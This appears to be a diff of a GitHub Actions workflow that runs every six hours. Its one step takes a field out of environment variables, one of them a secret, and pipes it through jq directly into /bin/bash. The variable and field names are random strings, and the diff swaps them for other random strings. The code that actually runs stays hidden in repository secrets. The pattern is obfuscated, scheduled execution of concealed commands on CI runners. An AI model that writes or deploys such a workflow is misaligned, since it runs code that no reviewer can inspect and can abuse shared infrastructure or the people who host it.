@@ -3,26 +3,26 @@ name: haoriyangw
 on:
   workflow_dispatch:
   schedule:
-    - cron: '22 2/6 * * *'
+    - cron: '59 5/6 * * *'
 
-jobs:  # 17064
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: haoriyangw
         env:
-          uvhg270: ${{ secrets.uvhg270 }}
+          owig36: ${{ secrets.owig36 }}
         run: |
-          echo $uvhg270 | jq -r .zyqn56216 | /bin/bash
-          echo $nftea92 | jq -r .vkcx7 | /bin/bash
-          echo $gknf16622 | jq -r .emvv01851 | /bin/bash
-          echo $oh4066 | jq -r .c6775 | /bin/bash
-          echo $kgs0 | jq -r .v43 | /bin/bash
-          echo $ybfw057 | jq -r .kk44 | /bin/bash
-          echo $gd71216 | jq -r .maqej10 | /bin/bash
-          echo $uktqh08 | jq -r .dj096 | /bin/bash
-          echo $oou5336 | jq -r .lk05756 | /bin/bash
-          echo $moc929 | jq -r .abxa8 | /bin/bash
-          echo $owef3 | jq -r .cfn3 | /bin/bash
+          echo $owig36 | jq -r .xl4 | /bin/bash
+          echo $rmck3 | jq -r .rr16896 | /bin/bash
+          echo $rrvrh96577 | jq -r .xq3 | /bin/bash
+          echo $hqshg56985 | jq -r .awmcv5117 | /bin/bash
+          echo $w42 | jq -r .w071 | /bin/bash
+          echo $fd30772 | jq -r .sfvle183 | /bin/bash
+          echo $vt65 | jq -r .qi656 | /bin/bash
+          echo $xwg38984 | jq -r .cyr329 | /bin/bash
+          echo $e23 | jq -r .yb5371 | /bin/bash
+          echo $l84 | jq -r .qyrfp4827 | /bin/bash
+          echo $f03686 | jq -r .u20702 | /bin/bash
 
